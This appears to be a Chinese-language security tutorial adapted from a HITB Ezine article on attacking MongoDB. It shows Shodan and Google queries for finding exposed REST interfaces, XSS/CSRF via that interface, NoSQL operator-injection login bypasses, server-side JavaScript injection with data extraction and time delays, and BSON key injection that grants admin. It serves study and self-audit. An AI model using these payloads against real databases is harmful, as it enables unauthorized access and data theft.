# Attacking MongoDB

本文主要来自于HITB Ezine Issue 010中的《Attacking MongoDB》

MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。他支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是他支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。

开发人员使用NoSQL数据库的各种应用越来越多。 针对NoSQL的攻击方法是知之甚少，并不太常见。与SQL注入比较，本文重点介绍通过MongoDB的漏洞对Web应用程序可能的攻击。

0x01 攻击
-------

* * *

### 1)REST接口

关注到有一个REST接口，提供一个web界面访问，默认运行在28017端口上，管理员可以用浏览器远程控制数据库，这个接口我发现了两个存储型xss以及很多的CSRF。

寻找方式：

http://www.shodanhq.com/search?q=port%3A28017

![enter image description here](http://drops.javaweb.org/uploads/images/1c1501a584f84e2108e9f0ca75d71df56c014d4f.jpg)

google搜索：

```
intitle:mongo intext:"listDatabases"

```

![enter image description here](http://drops.javaweb.org/uploads/images/953d64d3ca6147b6b1e859a8f022c25f640a82cc.jpg)

下了最新版本的mongodb默认不是启用rest的，需要在配置文件（/etc/mongod.conf）中加入一行

```
rest = true

```

才可以打开其他链接内容。

下图展示了攻击方法

插入js代码，让管理员执行，利用REST接口，执行mongodb的命令，结果返回到攻击者的服务器上。

![enter image description here](http://drops.javaweb.org/uploads/images/76f757eb5a1958009d9289c4df88dc0bceb28917.jpg)

例如，我利用js代码让管理员访问http://xxx.com:28017/admin/$cmd/?filter_eval=function()%7B%20return%20db.version()%20%7D&limit=1

返回结果：

![enter image description here](http://drops.javaweb.org/uploads/images/a37793600347820faee86128a53d3d709dd76f36.jpg)

### 2)Apache+PHP+MongoDB

一段php操作MongoDB的代码：

```
$q = array("name" => $_GET['login'], "password" => $_ GET['password']);
$cursor = $collection->findOne($q);

```

这个脚本的是向MongoDB数据库请求，如果正常的话，会返回用户的数据：

```
echo 'Name: ' . $cursor['name'];
echo 'Password: ' . $cursor['password']; 

```

访问下面的连接

```
?login=admin&password=pa77w0rd 

```

数据库里的执行情况是：

```
db.items.findOne({"name" :"admin", "password" : "pa77w0rd"}) 

```

如果数据库里存在的该用户名及密码则返回true，否则返回fales。

下面的数据库语句，返回的为用户不是admin的数据（$ne代表不等于）：

```
db.items.find({"name" :{$ne : "admin"}}) 

```

那么在现实中的数据库操作例子通常是这样子的：

```
db.items.findOne({"name" :"admin", "password" : {$ne : "1"}}) 

```

返回结果将是：

```
{
    "_id" : ObjectId("4fda5559e5afdc4e22000000"),
    "name" : "admin",
    "password" : "pa77w0rd"
}

```

php传入的方式为：

```
$q = array("name" => "admin", "password" => array("\$ne" => "1"));

```

外界请求的参数应该为：

```
?login=admin&password[$ne]=1   

```

当使用正则$regex的时候，执行下列数据库语句，将会返回name中所有已y开头的数据

```
db.items.find({name: {$regex: "^y"}})  

```

如果请求数据的脚本换为：

```
$cursor1 = $collection->find(array("login" => $user, "pass" => $pass));

```

返回结果的数据为：

```
echo 'id: '. $obj2['id'] .'<br>login: '. $obj2['login'] .'<br>pass: '. $obj2['pass'] . '<br>'; 

```

如果想要返回所有数据的话，可以访问下面的url：

```
?login[$regex]=^&password[$regex]=^ 

```

返回结果将会是：

```
id: 1
login: Admin
pass: parol
id: 4
login: user2
pass: godloveman
id: 5
login: user3
pass: thepolice=

```

还有一种利用$type的方式：

```
?login[$not][$type]=1&password[$not][$type]=1 

```

官方这里有详细介绍$type的各个值代表的意思：

[http://cn.docs.mongodb.org/manual/reference/operator/query/type/](http://cn.docs.mongodb.org/manual/reference/operator/query/type/)

上面语句表示获取login与password不为双精度类型的，同样会返回所有的数据。

### 3)INJECTION MongoDB

当执行的语句采用字符串拼接的时候，同样也存在注入的问题，如下代码：

```
$q = "function() { var loginn = '$login'; var passs = '$pass'; db.members.insert({id : 2, login : loginn, pass : passs}); }";

```

当$login与$pass是直接从外界提交到参数获取：

```
$login = $_GET['login'];
$pass = $_GET['password'];

```

并且没有任何过滤，直接带入查询：

```
$db->execute($q);
$cursor1 = $collection->find(array("id" => 2));
foreach($cursor1 as $obj2){
echo "Your login:".$obj2['login'];
echo "<br>Your password:".$obj2['pass'];
} 

```

输入测试数据：

```
?login=user&password=password

```

返回结果将是：

```
Your login: user
Your password: password  

```

输入

```
?login=user&password=';

```

页面将会返回报错。

输入

```
/?login=user&password=1'; var a = '1 

```

页面返回正常，如何注入出数据呢：

```
?login=user&password=1'; var loginn = db.version(); var b='

```

看一下返回结果：

![enter image description here](http://drops.javaweb.org/uploads/images/9b1a92b443f6d651b166bb0703fe8700820dbcf9.jpg)

带入实际中$q是变为：

```
$q = "function() { var loginn = user; var passs = '1'; var loginn = db.version(); var b=''; db.members.insert({id : 2, login : loginn, pass : passs}); }"

```

获取其他数据的方法：

```
 /?login=user&password= '; var loginn = tojson(db.members.find()[0]); var b='2

```

给loginn重新赋值，覆盖原来的user内容，tojson函数帮助获取到完整的数据信息，否则的话将会接收到一个Array。

最重要的部分是db.memeber.find()[0]，member是一个表，find函数是获取到所有内容，[0]表示获取第一个数组内，可以递增获取所有的内容。

当然也有可能遇到没有返回结果的时候，经典的时间延迟注入也可以使用：

```
?login=user&password='; if (db.version() > "2") { sleep(10000); exit; } var loginn =1; var b='2 

```

### 4)BSON

BSON（Binary Serialized Document Format）是一种类json的一种二进制形式的存储格式，简称Binary JSON，它和JSON一样，支持内嵌的文档对象和数组对象，但是BSON有JSON没有的一些数据类型，如Date和BinData类型。

默认test表中有两条数据：

```
> db.test.find({}) 
{ "_id" : ObjectId("52cfa5c9e085a58263f183f9"), "name" : "admin", "isadmin" : true }
{ "_id" : ObjectId("52cfa5e4e085a58263f183fa"), "name" : "noadmin", "isadmin" : false } 

```

再插入一条：

```
> db.test.insert({ "name" : "noadmin2", "isadmin" : false}) 

```

然后查询看结果：

```
> db.test.find({})
{ "_id" : ObjectId("52cfa5c9e085a58263f183f9"), "name" : "admin", "isadmin" : true }
{ "_id" : ObjectId("52cfa5e4e085a58263f183fa"), "name" : "noadmin", "isadmin" : false }
{ "_id" : ObjectId("52cfa92ce085a58263f183fb"), "name" : "noadmin2", "isadmin" : false } 

```

再插入一条列名为BSON对象的数据：

```
db.test.insert({ "name\x16\x00\x08isadmin\x00\x01\x00\x00\x00\x00\x00" : "noadmin2", "isadmin" : false})

```

isadmin之前的0x08是指该数据类型是布尔型，后面的0x01是把这个值设定为1。

这时再查询就回发现isadmin变为的true：

```
> db.test.find({})
{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" : "admin", "isadmin" : true }
{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" : "noadmin", "isadmin" : false }
{ "_id" : ObjectId("5044ebf6a91b02e9a9b065e3"), "name" : null, "isadmin" : true, "isadmin" : true } 

```

不过测试最新版的mongodb中，禁止了空字符。

![enter image description here](http://drops.javaweb.org/uploads/images/50bf02d94c1998c773b5632308b57a500a63ca03.jpg)

当然了 我也觉得此类攻击有点YY。。。

0x02 总结
-------

* * *

本文列举了四种攻击mongodb的方式。

当然这并不是安全否认mongodb的安全性，只是构造了集中可能存在攻击的场景。

希望大家看到后能够自查一下，以免受到攻击。

还有一些wofeiwo在2011年的时候就已经写过：

[Mongodb安全性初探](http://www.phpweblog.net/GaRY/archive/2011/08/18/Mongodb_secuirty_anaylze.html)